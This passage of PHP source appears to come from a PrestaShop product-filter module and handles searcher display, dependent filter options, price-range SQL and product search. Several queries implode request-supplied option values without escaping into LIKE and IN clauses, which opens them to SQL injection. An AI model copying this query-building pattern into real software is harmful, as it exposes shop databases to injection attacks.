                    if (!isset($_GET['id_category']) && strpos($_SERVER['PHP_SELF'], 'index.php') !== false){
                        if (($searcher['type_filter_category'] == $this->GLOBAL->TypeFilterCategory->AllCategories && in_array(1, $categories))
                            OR ($searcher['type_filter_category'] == $this->GLOBAL->TypeFilterCategory->OnlyCategories && !in_array(1, $categories))
                        ){
                            unset($all_searchers['all_searchers'][$key]);
                        }
                    }elseif (isset($_GET['id_category'])) {
                        if (($searcher['type_filter_category'] == $this->GLOBAL->TypeFilterCategory->AllCategories && in_array($_GET['id_category'], $categories))
                            OR ($searcher['type_filter_category'] == $this->GLOBAL->TypeFilterCategory->OnlyCategories && !in_array($_GET['id_category'], $categories))
                        ){
                            unset($all_searchers['all_searchers'][$key]);
                        }
                    } 
                }
                if ($searcher['hide_filter_manufacturer'] && !Tools::isSubmit('id_manufacturer')) {
                    unset($all_searchers['all_searchers'][$key]);
                }
                else if ($searcher['hide_filter_supplier'] && !Tools::isSubmit('id_supplier')) {
                    unset($all_searchers['all_searchers'][$key]);
                }
            }
        }
        
        $smarty->assign(array(
            'FILTERPRODUCTSPRO_DIR' => $this->_path,
            'FILTERPRODUCTSPRO_DIR_TPL' => dirname(__FILE__) . '/',
            'FILTERPRODUCTSPRO_IMG' => $this->_path . 'img/',
            'SEARCHERS' => $all_searchers['all_searchers'],
            'OPTIONS_FILTER_HIDE' => $all_searchers['options_filter_hide'],
            'GLOBAL' => $this->GLOBAL,
            'FPP_DISPLAY_BACK_BUTTON_FILTERS' => (int)Configuration::get('FPP_DISPLAY_BACK_BUTTON_FILTERS'),
            'FPP_DISPLAY_EXPAND_BUTTON_OPTION' => (int)Configuration::get('FPP_DISPLAY_EXPAND_BUTTON_OPTION'),
            'FPP_ONLY_PRODUCTS_STOCK' => (int)Configuration::get('FPP_ONLY_PRODUCTS_STOCK')
        ));

        if ($position == $this->GLOBAL->Positions->Top)
            return $this->display(__FILE__, $this->name . '_top.tpl');

        return $this->display(__FILE__, $this->name . '.tpl');
    }
    
    private function getFilterByPositions($positions){
        global $cookie;
                        
        $all_searchers = array();
        $options_filter_hide = array();
        $_searchers = SearcherClass::getSearchersByPosition($positions, $cookie->id_lang, TRUE);
                
        foreach ($_searchers as $index_s => $searchers) {
            if(
                ($searchers['hide_filter_category'] && !Tools::isSubmit('id_category')) ||
                ($searchers['hide_filter_manufacturer'] && !Tools::isSubmit('id_manufacturer')) ||
                ($searchers['hide_filter_supplier'] && !Tools::isSubmit('id_supplier'))
            ){
                continue;
            }
            
            $hide_page = false;
            $where_page = '';
            $ids_products_filtered = array();
            if($searchers['hide_filter_category'] && Tools::isSubmit('id_category')) {
                $where_page .='AND s.hide_filter_category = TRUE ';
                $hide_page = true;
                //Get ids products category, if is empty, fill array for prevent errors in next query
                
                
                $_ids_products_category = Db::getInstance()->ExecuteS("
                    SELECT id_product
                    FROM " . _DB_PREFIX_ . "category_product
                    WHERE id_category = " . (int)Tools::getValue('id_category') . "
                ");
                
                if($_ids_products_category && is_array($_ids_products_category) && !sizeof($_ids_products_category))
                    $_ids_products_category = array(0);
                foreach ($_ids_products_category as $data) {
                    $ids_products_filtered[] = $data['id_product'];
                }
            }
            if($searchers['hide_filter_manufacturer'] && Tools::isSubmit('id_manufacturer')) {
                $where_page .='AND s.hide_filter_manufacturer = TRUE ';
                $hide_page = true;
                //Get ids products category, if is empty, fill array for prevent errors in next query
                $_ids_products_manufacturer = Db::getInstance()->ExecuteS("
                    SELECT id_product
                    FROM " . _DB_PREFIX_ . "product
                    WHERE id_manufacturer = " . (int)Tools::getValue('id_manufacturer') . "
                ");
                if($_ids_products_manufacturer && is_array($_ids_products_manufacturer) && !sizeof($_ids_products_manufacturer))
                    $_ids_products_manufacturer = array();
                                
                foreach ($_ids_products_manufacturer as $data) {
                    $ids_products_filtered[] = $data['id_product'];
                }
                
            }
            if($searchers['hide_filter_supplier'] && Tools::isSubmit('id_supplier')) {
                $where_page .='AND s.hide_filter_supplier = TRUE ';
                $hide_page = true;
                //Get ids products category, if is empty, fill array for prevent errors in next query
                $_ids_products_supplier = Db::getInstance()->ExecuteS("
                    SELECT id_product
                    FROM " . _DB_PREFIX_ . "product
                    WHERE id_supplier = " . (int)Tools::getValue('id_supplier') . "
                ");
                
                if($_ids_products_supplier && is_array($_ids_products_supplier) && !sizeof($_ids_products_supplier))
                    $_ids_products_supplier = array();
                
                foreach ($_ids_products_supplier as $data) {
                    $ids_products_filtered[] = $data['id_product'];
                }
            }
            
            if ($hide_page) {
                //obtiene los id_product de la categoria en cuestion. segun el index_products
                $options_by_filter = Db::getInstance()->ExecuteS("
                    SELECT 
                        DISTINCT(ip.id_option), f.id_filter
                    FROM 
                        " . _DB_PREFIX_ . "fpp_index_product AS ip,
                        " . _DB_PREFIX_ . "fpp_filter AS f,
                        " . _DB_PREFIX_ . "fpp_searcher AS s
                    WHERE  
                        ip.id_filter = f.id_filter
                        " . $where_page . "
                        AND s.id_searcher = f.id_searcher
                        AND s.id_searcher = ".(int)$searchers['id_searcher'] . "                                                                                               
                        AND ip.id_product IN (" . implode(',', $ids_products_filtered) . ")
                ");
                
                if($options_by_filter && is_array($options_by_filter)){
                    foreach ($options_by_filter as $data) {
                        $options_filter_hide[$data['id_filter']][] = $data['id_option'];
                    }
                }
            }       
                                   
            $filters = FilterClass::getFiltersListBySearcher($cookie->id_lang, (int) $searchers['id_searcher'], TRUE);

            foreach ($filters as $index_f => $filter) {
                $id_filter = (int) $filter['id_filter'];

                $options = OptionClass::getOptionListByFilterAndCheckIndexProducts($cookie->id_lang, $id_filter, TRUE);
                $columns = FilterClass::getColumns($id_filter);

                $ids_options = array();
                $data_columns = array();

                $add_filter = TRUE;
                
                $has_options = false; //sirve para validar posteriormente si el filtro si tiene opciones en algunas de las columnas.
                foreach ($columns as $col) {
                    $id_column = (int) $col['id_column'];
                    $options_column = ColumnOptionClass::getOptionsByColumnAndCheckIndexProducts($id_column, TRUE);

                    $options_by_column = array();

                    foreach ($options_column as $option_column) {
                        $id_option = (int) $option_column['id_option'];
                        array_push($ids_options, $id_option);
                        
                        if(
                        (
                            ($searchers['hide_filter_category']  && Tools::isSubmit('id_category') ) ||
                            ($searchers['hide_filter_manufacturer']  && Tools::isSubmit('id_manufacturer') ) ||
                            ($searchers['hide_filter_supplier']  && Tools::isSubmit('id_supplier') ) 
                        )
                        && !in_array($id_option, (isset($options_filter_hide[$id_filter]) ? $options_filter_hide[$id_filter] : array())))
                        {
                            continue;
                        }
                        
                        $option = OptionClass::getOptionById($cookie->id_lang, $id_option, TRUE);
                        $option[0]['color'] = OptionClass::getColorByOption($id_option); //Obtener {color} de la opcion, si no tiene retorna {NULL}     
                        $option[0]['value'] = $filter['criterion'] == $this->GLOBAL->Criterions->Price ? $this->getLabelOptionRangePrice($option[0]['value']) : $option[0]['value'];

                        if (is_array($option) && sizeof($option))
                            array_push($options_by_column, $option[0]);
                    }

                    $ColumnClass = new ColumnClass($id_column);
                
                    $data_columns[$id_column]['data'] = array(
                        'value' => $ColumnClass->value[$cookie->id_lang]
                    );
                    $data_columns[$id_column]['options'] = $options_by_column;
                    
                    if (sizeof($options_by_column))
                        $has_options = true;                                        
                }
                
                //si tiene columnas y no tiene opciones en ninguna columna del filtro, no se muestra el filtro.
                if(
                    (
                        ($searchers['hide_filter_category']  && Tools::isSubmit('id_category') ) ||
                        ($searchers['hide_filter_manufacturer']  && Tools::isSubmit('id_manufacturer') ) ||
                        ($searchers['hide_filter_supplier']  && Tools::isSubmit('id_supplier') ) 
                    ) && Tools::isSubmit('id_category') && sizeof($columns) && !$has_options) 
                {
                    $add_filter = FALSE;
                }

                $free_options = array();
                
                $_options_filter_hide = isset($options_filter_hide[$id_filter]) ? array_flip($options_filter_hide[$id_filter]) : array();
                
                foreach ($options as $option) {
                    $id_option = (int) $option['id_option'];
                    //esto no sirve porque trae lo mismo que ya tiene
                    //$option = OptionClass::getOptionById($cookie->id_lang, $id_option, TRUE);
                    
                    if(
                        (
                            ($searchers['hide_filter_category']  && Tools::isSubmit('id_category') ) ||
                            ($searchers['hide_filter_manufacturer']  && Tools::isSubmit('id_manufacturer') ) ||
                            ($searchers['hide_filter_supplier']  && Tools::isSubmit('id_supplier') ) 
                        )
                        && !isset($_options_filter_hide[$id_option])
                    ){
                        continue;                    
                    }

                    if (!in_array($id_option, $ids_options) && sizeof($option)) {
                        $option['color'] = OptionClass::getColorByOption($id_option); //Obtener {color} de la opcion, si no tiene retorna {NULL} 
                        $option['value'] = $filter['criterion'] == $this->GLOBAL->Criterions->Price ? $this->getLabelOptionRangePrice($option['value']) : $option['value'];
                        array_push($free_options, $option);
                    }
                }
                
                $filters[$index_f]['free_options'] = $free_options;
                $filters[$index_f]['columns'] = $data_columns;
                
                if(!$add_filter)
                    unset($filters[$index_f]);
            }

            $_searchers[$index_s]['filters'] = $filters;
            $all_searchers[] = $_searchers[$index_s];
        }
                
        return array(
            'all_searchers' => $all_searchers,
            'options_filter_hide' => $options_filter_hide
        );
    }

    private function getLabelOptionRangePrice($value) {
        try {
            $data = explode(',', $value);
            $condition = $data[0];
            $first_value = (float) (isset($data[1]) ? $data[1] : 0);
            $second_value = (float) (isset($data[2]) ? $data[2] : 0);

            $_condition = '';
            switch ($condition) {
                case $this->GLOBAL->ConditionsRangePrice->Lt:
                    $_condition = '<';
                    break;
                case $this->GLOBAL->ConditionsRangePrice->Gt:
                    $_condition = '>';
                    break;
                case $this->GLOBAL->ConditionsRangePrice->Bt:
                    $_condition = '-';
                    break;
            }
            
            $currency_default = new Currency(Configuration::get('PS_CURRENCY_DEFAULT'));
            
            $first_value = (!is_null($first_value) ? Tools::displayPrice($first_value, $currency_default) : '');
            $second_value = (!empty($second_value) ? Tools::displayPrice($second_value, $currency_default) : '');

            if ($condition == $this->GLOBAL->ConditionsRangePrice->Bt)
                return $first_value . (!is_null($second_value) ? '&nbsp;' . $_condition . '&nbsp;' . $second_value : '');

            return (!empty($_condition) ? $_condition . '&nbsp;' : '') . $first_value . (!empty($second_value) ? '&nbsp;' . $this->l('and') . '&nbsp;' . $second_value : '');
        } catch (Exception $e) {
            return $value;
        }
    }

    private function getEmptyValuesLang($val = '_') {
        $languages = Language::getLanguages(false);
        $values = array();

        foreach ($languages as $lang) {
            $values[$lang['id_lang']] = (string) $val;
        }

        return $values;
    }

    //FRONT_OFFICE
    public function getAvailableOptionsDependency($id_filter_parent = 0, $options) {
        if (empty($id_filter_parent) || !sizeof($options))
            return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_ERROR, 'message' => $this->l('An error occurred while trying retrieve data.')));
                
        $id_filter_child = NULL;
        $options_availables = array();            
        
        $FilterParentClass = new FilterClass($id_filter_parent);
        $FilterChildClass = NULL;                
        
        if (Validate::isLoadedObject($FilterParentClass)){
            $id_filter_child = Db::getInstance()->getValue("
                SELECT 
                    f.id_filter 
                FROM                     
                    " . _DB_PREFIX_ . "fpp_filter AS f
                WHERE                    
                    f.id_parent = ".(int)$id_filter_parent);
            
            //para opciones personalizadas.            
            $dependency_options = Db::getInstance()->ExecuteS("
                SELECT 
                    * 
                FROM 
                    " . _DB_PREFIX_ . "fpp_dependency_option 
                WHERE 
                    id_filter_parent = " . (int)$id_filter_parent . "
                    AND ids_option LIKE '" . implode(',', $options) . ",%'");
                         
            $options_dependency = array();           
            if (is_array($dependency_options))
                foreach($dependency_options AS $dependency_option){                
                    $ids_option = $dependency_option['ids_option'];
                    $arr_ids_option = explode(',', $ids_option);
                    
                    $id_filter_child = $dependency_option['id_filter'];                        
                    
                    if (!Validate::isLoadedObject($FilterChildClass)){
                        $FilterChildClass = new FilterClass($id_filter_child);
                    }
                    
                    if (Validate::isLoadedObject($FilterChildClass)){
                        if ($arr_ids_option[$FilterParentClass->level_depth] == $options[sizeof($options) - 1])//selecciona la ultima opcion enviada
                            $options_dependency[(int) $arr_ids_option[$FilterChildClass->level_depth]] = (int) $arr_ids_option[$FilterChildClass->level_depth];//para evitar opciones repetidas.                        
                    }
                }

            //modificacion para que se envien las opciones en el orden segun la posicion que se tiene.
            //----------------------------------------------------------------------------------------
            if (sizeof($options_dependency)){
                $_id_options = array();
                foreach($options_dependency AS $key => $_id_option){
                    array_push($_id_options, $_id_option);
                }
                $__id_options = Db::getInstance()->executeS('SELECT id_option FROM ' . _DB_PREFIX_ . 'fpp_option WHERE id_option IN (' . implode(',', $_id_options) . ') ORDER BY position');
                
                if($__id_options)
                    foreach($__id_options AS $row){
                        array_push($options_availables, (int) $row['id_option']);
                    }
            }
            //----------------------------------------------------------------------------------------                    
            
            //para opciones normales.
            $options_normal = Db::getInstance()->ExecuteS("
                SELECT 
                    DISTINCT(ip.id_option) 
                FROM 
                    " . _DB_PREFIX_ . "fpp_index_product AS ip,
                    " . _DB_PREFIX_ . "fpp_filter AS f,
                    " . _DB_PREFIX_ . "fpp_option AS o
                WHERE
                    ip.id_filter = f.id_filter AND
                    ip.id_option = o.id_option AND
                    f.criterion <> '" . $this->GLOBAL->Criterions->Custom . "' AND
                    ip.id_filter = ".(int)$id_filter_child . "
                ORDER BY o.position");
            
            foreach($options_normal AS $option){
                array_push($options_availables, (int) $option['id_option']);
            }
            
            $cant_options_filter = 0;
            if (!empty($id_filter_child))
                $cant_options_filter = Db::getInstance()->getValue('SELECT count(*) FROM ' . _DB_PREFIX_ . 'fpp_option WHERE id_filter = ' .$id_filter_child);
        }        
        
        $data = array(
            'id_filter_child' => $id_filter_child,
            'cant_options_filter' => (int)$cant_options_filter,
            'options' => $options_availables
        );
        
        return $this->jsonEncode(array('message_code' => VAR_FILTERPRODUCTSPRO_EXITO, 'data' => $data));
    }

    private function getSQLSentencePrice($ids_option, $field = 'price', $operator = "OR") {
        $options = Db::getInstance()->ExecuteS("
            SELECT
                o.*,
                ocl.value
            FROM 
                " . _DB_PREFIX_ . "fpp_option AS o,
                " . _DB_PREFIX_ . "fpp_option_criterion AS oc,
                " . _DB_PREFIX_ . "fpp_option_criterion_lang AS ocl
            WHERE
                oc.id_option_criterion = o.id_option_criterion
                AND ocl.id_option_criterion = oc.id_option_criterion
                AND ocl.id_lang = " . (int) $this->id_lang . "
                AND oc.criterion = '" . $this->GLOBAL->Criterions->Price . "'
                AND o.id_option IN (" . implode(',', $ids_option) . ")
        ");

        $sql_sentence = "";

        foreach ($options as $i => $option) {
            $data = explode(',', $option['value']);
            $condition = isset($data[0]) ? $data[0] : '';
            $first_value = (float) (isset($data[1]) ? $data[1] : 0);
            $second_value = (float) (isset($data[2]) ? $data[2] : 0);

            $first_value = (is_numeric($first_value) ? $first_value : '');
            $second_value = (is_numeric($second_value) ? $second_value : '');
                        
            if (!empty($condition) && is_numeric($first_value)) {
                $_condition = '=';
                switch ($condition) {
                    case $this->GLOBAL->ConditionsRangePrice->Eq:
                        $_condition = '=';
                        break;
                    case $this->GLOBAL->ConditionsRangePrice->Lt:
                        $_condition = '<';
                        break;
                    case $this->GLOBAL->ConditionsRangePrice->Gt:
                        $_condition = '>';
                        break;
                    case $this->GLOBAL->ConditionsRangePrice->Bt:
                        $_condition = 'BETWEEN';
                        break;
                }

                if ($condition == $this->GLOBAL->ConditionsRangePrice->Bt)
                    $sql_sentence .= " " . $field . " " . $_condition . " " . $first_value . " AND " . $second_value . " ";
                else
                    $sql_sentence .= " " . $field . " " . $_condition . $first_value . " ";

                if ($i != (sizeof($options) - 1))
                    $sql_sentence .= $operator . " ";
            }
        }

        return empty($sql_sentence) ? '1=1' : $sql_sentence;
    }

    //Verifica si todas las opciones son de {Price}
    private function validaOptionsOnlyPrice($ids_option = array()) {
        $result = Db::getInstance()->getRow("
            SELECT
                COUNT(o.id_option) AS num_options
            FROM 
                " . _DB_PREFIX_ . "fpp_option AS o,
                " . _DB_PREFIX_ . "fpp_option_criterion AS oc
            WHERE
                oc.id_option_criterion = o.id_option_criterion
                AND oc.criterion = '" . $this->GLOBAL->Criterions->Price . "'
                AND o.id_option IN (" . implode(',', $ids_option) . ")
        ");

        $num_options = isset($result['num_options']) ? (int) $result['num_options'] : 0;

        return (sizeof($ids_option) == $num_options ? TRUE : FALSE);
    }

    private function getProductsSearchUsePSEnginge($ids_option = array()) {
        if (is_array($ids_option) && sizeof($ids_option)) {
            $all_products = array();
            $_all_products = array();

            $values = Db::getInstance()->ExecuteS("
                SELECT 
                    DISTINCT(TRIM(ocl.value)) AS value
                FROM 
                    " . _DB_PREFIX_ . "fpp_option AS o,
                    " . _DB_PREFIX_ . "fpp_filter AS f,
                    " . _DB_PREFIX_ . "fpp_option_criterion_lang AS ocl
                WHERE 
                    f.id_filter = o.id_filter
                    AND ocl.id_option_criterion = o.id_option_criterion
                    AND ocl.id_lang = " . $this->id_lang . "
                    AND o.id_option IN (" . implode(',', $ids_option) . ")
                    AND f.search_ps = TRUE
            ");

            foreach ($values as $value) {
                $data = Search::find($this->id_lang, $value['value'], 1, 999999, 'position', 'desc');

                if ($data && isset($data['result'])) {
                    array_push($_all_products, $products = $data['result']);
                }
            }

            foreach ($_all_products as $products) {
                foreach ($products as $product) {
                    if (!in_array($product['id_product'], $all_products))
                        $all_products[$product['id_product']] = $product;
                }
            }

            return $all_products;
        }
        else
            return array();
    }

    public function searchProducts($pageNumber = 1, $nbProducts = 10, $count = FALSE, $orderBy = NULL, $orderWay = NULL) {
        if ($pageNumber < 1)
            $pageNumber = 1;
        if (empty($orderBy) || $orderBy == 'position')
            $orderBy = 'date_add';
        if (empty($orderWay))
            $orderWay = 'DESC';
        if ($orderBy == 'id_product' OR $orderBy == 'price' OR $orderBy == 'date_add')
            $orderByPrefix = 'p';
        elseif ($orderBy == 'name')
            $orderByPrefix = 'pl';
        if (!Validate::isOrderBy($orderBy) OR !Validate::isOrderWay($orderWay))
            die(Tools::displayError());

        $options = Tools::getValue('options', array());

        if(is_array($options)){
            foreach ($options as $it => $option)
                if(empty ($option))
                    unset($options[$it]);
        }else{
            $_options = explode(',', $options);
            
            foreach ($_options as $it => $option)
                if(empty ($option))
                    unset($_options[$it]);
                    
            $options = $_options;            
        }
        
        if (empty($options) || !sizeof($options))
            return FALSE;

        $ids_product = OptionClass::getIdsProductsFromIndexByOptions($options, (int)Tools::getValue('id_searcher'));                                   
        
        //SI EL BUSCADOR TIENE ACTIVA LA OPCION DE OCULTAR FILTROS POR CATEGORIA, SOLO TRAEMOS RESULTADOS SEGUN LA CATEGORIA.
        $searcher = new SearcherClass(Tools::getValue('id_searcher'));       
        $hide_page = false;
        $where_page = '';
        $ids_products_filtered = array(0);
        if(Validate::isLoadedObject($searcher) && $searcher->hide_filter_category && Tools::isSubmit('id_category')){
            $where_page .='AND s.hide_filter_category = TRUE ';
            $hide_page = true;
            //Get ids products category, if is empty, fill array for prevent errors in next query
            $_ids_products_category = Db::getInstance()->ExecuteS("
                SELECT id_product
                FROM " . _DB_PREFIX_ . "category_product
                WHERE id_category = " . (int)Tools::getValue('id_category') . "
            ");
            if($_ids_products_category && is_array($_ids_products_category) && !sizeof($_ids_products_category))
                $_ids_products_category = array(0);
            
            foreach ($_ids_products_category as $data) {
                $ids_products_filtered[] = $data['id_product'];
            }
        }
        if(Validate::isLoadedObject($searcher) && $searcher->hide_filter_manufacturer && Tools::isSubmit('id_manufacturer')){
            $where_page .='AND s.hide_filter_manufacturer = TRUE ';
            $hide_page = true;
            //Get ids products category, if is empty, fill array for prevent errors in next query
            $_ids_products_manufacturer = Db::getInstance()->ExecuteS("
                SELECT id_product
                FROM " . _DB_PREFIX_ . "product
                WHERE id_manufacturer = " . (int)Tools::getValue('id_manufacturer') . "
            ");
            if($_ids_products_manufacturer && is_array($_ids_products_manufacturer) && !sizeof($_ids_products_manufacturer))
                $_ids_products_manufacturer = array(0);
            
            foreach ($_ids_products_manufacturer as $data) {
                $ids_products_filtered[] = $data['id_product'];
            }
        }
        if(Validate::isLoadedObject($searcher) && $searcher->hide_filter_supplier && Tools::isSubmit('id_supplier')){
            $where_page .='AND s.hide_filter_supplier = TRUE ';
            $hide_page = true;
            //Get ids products category, if is empty, fill array for prevent errors in next query
            $_ids_products_supplier = Db::getInstance()->ExecuteS("
                SELECT id_product
                FROM " . _DB_PREFIX_ . (version_compare(_PS_VERSION_, '1.5') >= 0 ? 'product_supplier' : 'product') ."
                WHERE id_supplier = " . (int)Tools::getValue('id_supplier') . "
            ");
            if($_ids_products_supplier && is_array($_ids_products_supplier) && !sizeof($_ids_products_supplier))
                $_ids_products_supplier = array(0);
            
            foreach ($_ids_products_supplier as $data) {
                $ids_products_filtered[] = $data['id_product'];
            }
        }
                
        if ($hide_page) {
            //obtiene los id_product de la categoria en cuestion. segun el index_products
            $_products_by_category = Db::getInstance()->ExecuteS("
                SELECT 
                    DISTINCT(ip.id_product)
                FROM 
                    " . _DB_PREFIX_ . "fpp_index_product AS ip,                    
                    " . _DB_PREFIX_ . "fpp_searcher AS s
                WHERE  
                    ip.id_searcher = s.id_searcher
                    " . $where_page . "
                    AND ip.id_searcher = ".(int)$searcher->id."                                                                                               
                    AND ip.id_product IN (" . implode(',', $ids_products_filtered) . ")
            ");
            
            $products_by_category = array();
            if($_products_by_category && is_array($_products_by_category)){
                foreach ($_products_by_category as $data) {
                    $products_by_category[] = $data['id_product'];
                }

                $tmp_ids_product = array_intersect($ids_product, $products_by_category);
                
                if (sizeof($tmp_ids_product))
                    $ids_product = $tmp_ids_product;                             
            }            
        }

        $groups = $this->getCurrentCustomerGroups();
        $sqlGroups = (count($groups) ? 'IN (' . implode(',', $groups) . ')' : '= 1');

        $products_engine_ps = $this->getProductsSearchUsePSEnginge($options);
        if (sizeof($products_engine_ps))
            $ids_product = array_merge($ids_product, array_keys($products_engine_ps));

        if (sizeof($ids_product) == 0)
            $ids_product = array(0);                       

        //VERSION 1.5
        if(version_compare(_PS_VERSION_, '1.5') >= 0){
            $context = Context::getContext();

    		$front = true;
    		if (!in_array($context->controller->controller_type, array('front', 'modulefront')))
    			$front = false;
            
            if ($count)
    		{
    			$sql = 'SELECT COUNT(p.`id_product`) AS nb
    					FROM `'._DB_PREFIX_.'product` p
    					'.Shop::addSqlAssociation('product', 'p').'
    					WHERE product_shop.`active` = 1    					
    					'.($front ? ' AND product_shop.`visibility` IN ("both", "catalog")' : '').'
    					AND p.`id_product` IN (
    						SELECT cp.`id_product`
    						FROM `'._DB_PREFIX_.'category_group` cg
    						LEFT JOIN `'._DB_PREFIX_.'category_product` cp ON (cp.`id_category` = cg.`id_category`)
    						WHERE cg.`id_group` '.$sqlGroups.' AND cp.`id_product` IN (' . implode(',', $ids_product) . ')
    					)';
    			return (int)Db::getInstance(_PS_USE_SQL_SLAVE_)->getValue($sql);
    		}

            $sql = 'SELECT p.*, product_shop.*, stock.out_of_stock, IFNULL(stock.quantity, 0) as quantity, product_attribute_shop.`id_product_attribute`, pl.`description`, pl.`description_short`, pl.`available_now`,
					pl.`available_later`, pl.`link_rewrite`, pl.`meta_description`, pl.`meta_keywords`, pl.`meta_title`, pl.`name`, image_shop.`id_image`,
					il.`legend`, m.`name` AS manufacturer_name, tl.`name` AS tax_name, t.`rate`,
					(product_shop.`price` * IF(t.`rate`,((100 + (t.`rate`))/100),1)) AS orderprice
				FROM `'._DB_PREFIX_.'product` p
				'.Shop::addSqlAssociation('product', 'p').'
				LEFT JOIN `'._DB_PREFIX_.'product_attribute` pa
				ON (p.`id_product` = pa.`id_product`)
				'.Shop::addSqlAssociation('product_attribute', 'pa', false, 'product_attribute_shop.`default_on` = 1').'
				'.Product::sqlStock('p', 'product_attribute_shop', false, $context->shop).'
				LEFT JOIN `'._DB_PREFIX_.'product_lang` pl
					ON (p.`id_product` = pl.`id_product`
					AND pl.`id_lang` = '.(int)$this->id_lang.Shop::addSqlRestrictionOnLang('pl').')
				LEFT JOIN `'._DB_PREFIX_.'image` i
					ON (i.`id_product` = p.`id_product`)'.
				Shop::addSqlAssociation('image', 'i', false, 'image_shop.cover=1').'
				LEFT JOIN `'._DB_PREFIX_.'image_lang` il
					ON (image_shop.`id_image` = il.`id_image`
					AND il.`id_lang` = '.(int)$this->id_lang.')
				LEFT JOIN `'._DB_PREFIX_.'tax_rule` tr
					ON (product_shop.`id_tax_rules_group` = tr.`id_tax_rules_group`
					AND tr.`id_country` = '.(int)$context->country->id.'
					AND tr.`id_state` = 0
					AND tr.`zipcode_from` = 0)
				LEFT JOIN `'._DB_PREFIX_.'tax` t
					ON (t.`id_tax` = tr.`id_tax`)
				LEFT JOIN `'._DB_PREFIX_.'tax_lang` tl
					ON (t.`id_tax` = tl.`id_tax`
					AND tl.`id_lang` = '.(int)$this->id_lang.')
				LEFT JOIN `'._DB_PREFIX_.'manufacturer` m
					ON m.`id_manufacturer` = p.`id_manufacturer`
				WHERE product_shop.`id_shop` = '.(int)$context->shop->id.'
				AND (pa.id_product_attribute IS NULL OR product_attribute_shop.id_shop='.(int)$context->shop->id.') 
				AND (i.id_image IS NULL OR image_shop.id_shop='.(int)$context->shop->id.')                
                AND product_shop.`active` = 1
                AND p.`id_product` IN (
        		    SELECT cp.`id_product`
                            FROM `' . _DB_PREFIX_ . 'category_group` cg
                            LEFT JOIN `' . _DB_PREFIX_ . 'category_product` cp ON (cp.`id_category` = cg.`id_category`)
                            WHERE 
                                cg.`id_group` ' . $sqlGroups . '
                                AND cp.`id_product` IN(' . implode(',', $ids_product) . ')
        		)'
				.($front ? ' AND product_shop.`visibility` IN ("both", "catalog")' : '')
                .' GROUP BY p.`id_product` '				
                .' ORDER BY ' . (isset($orderByPrefix) ? pSQL($orderByPrefix) . '.' : '') . '`' . pSQL($orderBy) . '` ' . pSQL($orderWay)
        		.' LIMIT ' . (int) (((int) $pageNumber - 1) * $nbProducts) . ', ' . $nbProducts;

    		$result = Db::getInstance(_PS_USE_SQL_SLAVE_)->executeS($sql);
        //VERSIONES 1.2, 1.3 y 1.4
        }else{
            if ($count) {
                $result = Db::getInstance()->getRow('
    			SELECT COUNT(`id_product`) AS nb
    			FROM `' . _DB_PREFIX_ . 'product` p
    			WHERE `active` = 1
    			AND p.`id_product` IN (
    				SELECT cp.`id_product`
    				FROM `' . _DB_PREFIX_ . 'category_group` cg
    				LEFT JOIN `' . _DB_PREFIX_ . 'category_product` cp ON (cp.`id_category` = cg.`id_category`)
    				WHERE 
                                        cg.`id_group` ' . $sqlGroups . '
                                        AND cp.`id_product` IN(' . implode(',', $ids_product) . ')
    			)');
                return (int) ($result['nb']);
            }
            
            $sql_joins = "";
            if(version_compare(_PS_VERSION_, '1.4') < 0){
                $sql_joins = 'LEFT JOIN ps_tax t ON (p.id_tax = t.id_tax)';
            }
            else{
                $sql_joins = 'LEFT JOIN `' . _DB_PREFIX_ . 'tax_rule` tr ON (p.`id_tax_rules_group` = tr.`id_tax_rules_group`
                                AND tr.`id_country` = ' . (int) $this->getDefaultCountryId() . '
                                AND tr.`id_state` = 0)
                            LEFT JOIN `' . _DB_PREFIX_ . 'tax` t ON (t.`id_tax` = tr.`id_tax`)';
            }
                            
            $result = Db::getInstance()->ExecuteS('
        		SELECT p.*, pl.`description`, pl.`description_short`, pl.`link_rewrite`, pl.`meta_description`, pl.`meta_keywords`, pl.`meta_title`, pl.`name`, pl.`available_later`, pl.`available_now`, p.`ean13`,
        			i.`id_image`, il.`legend`, t.`rate`, m.`name` AS manufacturer_name,
        			(p.`price` * ((100 + (t.`rate`))/100)) AS orderprice, pa.id_product_attribute
        		FROM `' . _DB_PREFIX_ . 'product` p
        		LEFT JOIN `' . _DB_PREFIX_ . 'product_lang` pl ON (p.`id_product` = pl.`id_product` AND pl.`id_lang` = ' . (int) ($this->id_lang) . ')
        		LEFT OUTER JOIN `' . _DB_PREFIX_ . 'product_attribute` pa ON (p.`id_product` = pa.`id_product` AND `default_on` = 1)
        		LEFT JOIN `' . _DB_PREFIX_ . 'image` i ON (i.`id_product` = p.`id_product` AND i.`cover` = 1)
        		LEFT JOIN `' . _DB_PREFIX_ . 'image_lang` il ON (i.`id_image` = il.`id_image` AND il.`id_lang` = ' . (int) ($this->id_lang) . ')
        		' . $sql_joins . '
        		LEFT JOIN `' . _DB_PREFIX_ . 'manufacturer` m ON (m.`id_manufacturer` = p.`id_manufacturer`)
        		WHERE p.`active` = 1
        		AND p.`id_product` IN (
        		    SELECT cp.`id_product`
                            FROM `' . _DB_PREFIX_ . 'category_group` cg
                            LEFT JOIN `' . _DB_PREFIX_ . 'category_product` cp ON (cp.`id_category` = cg.`id_category`)
                            WHERE 
                                cg.`id_group` ' . $sqlGroups . '
                                AND cp.`id_product` IN(' . implode(',', $ids_product) . ')
        		)
                ORDER BY ' . (isset($orderByPrefix) ? pSQL($orderByPrefix) . '.' : '') . '`' . pSQL($orderBy) . '` ' . pSQL($orderWay) . '
        		LIMIT ' . (int) (((int) $pageNumber - 1) * $nbProducts) . ', ' . $nbProducts);                           
        }

        $products = array();

        if ($result)
            foreach ($result as $row) {
                $products[] = Product::getProductProperties($this->id_lang, $row);
                if (isset($products_engine_ps[$row['id_product']]))
                    unset($products_engine_ps[$row['id_product']]);
            }

        return $products;
    }

    public function pagination($nbProducts = 10) {
        global $cookie, $smarty;

        $nArray = (int) (Configuration::get('PS_PRODUCTS_PER_PAGE')) != 10 ? array((int) (Configuration::get('PS_PRODUCTS_PER_PAGE')), 10, 20, 50) : array(10, 20, 50);
        // Clean duplicate values
        $nArray = array_unique($nArray);
        asort($nArray);
        $this->n = abs((int) (Tools::getValue('n', ((isset($cookie->nb_item_per_page) AND $cookie->nb_item_per_page >= 10) ? $cookie->nb_item_per_page : (int) (Configuration::get('PS_PRODUCTS_PER_PAGE'))))));
        $this->p = abs((int) (Tools::getValue('p', 1)));

        $range = 2; /* how many pages around page selected */

        if ($this->p < 0)
            $this->p = 0;

